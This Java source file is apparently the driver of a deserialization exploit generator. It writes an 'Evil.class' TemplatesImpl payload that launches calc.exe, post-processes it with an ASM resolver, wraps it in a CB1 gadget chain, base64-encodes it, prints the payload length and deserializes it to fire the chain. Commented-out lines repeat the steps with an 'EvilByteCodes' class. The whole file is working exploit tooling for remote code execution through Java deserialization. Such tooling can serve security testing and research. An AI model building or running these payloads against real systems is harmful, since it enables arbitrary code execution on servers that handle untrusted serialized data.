package org.sec;

import org.sec.asm.Resolver;
import org.sec.payload.CB1;
import org.sec.payload.Generator;
import org.sec.payload.Payload;

import java.io.File;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Main {
    public static void main(String[] args) {
        try {
            byte[] data = Base64.getEncoder().encode(Files.readAllBytes(Paths.get("test.ser")));
            System.out.println(new String(data).length());
//            Payload.deserialize(Base64.getDecoder().decode(data));

//            byte[] evilBytesCode = Files.readAllBytes(Paths.get("./target/classes/org/sec/payload/EvilByteCodes.class"));
//            byte[] my = Base64.getEncoder().encode(CB1.getPayloadUseByteCodes(evilBytesCode));
//            System.out.println(new String(my).length());
//            Payload.deserialize(Base64.getDecoder().decode(my));

            String path = System.getProperty("user.dir") + File.separator + "Evil.class";
            Generator.saveTemplateImpl(path, "calc.exe");
            Resolver.resolve("Evil.class");
            byte[] newByteCodes = Files.readAllBytes(Paths.get("Evil.class"));
            byte[] payload = Base64.getEncoder().encode(CB1.getPayloadUseByteCodes(newByteCodes));
            System.out.println(new String(payload).length());
            Payload.deserialize(Base64.getDecoder().decode(payload));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
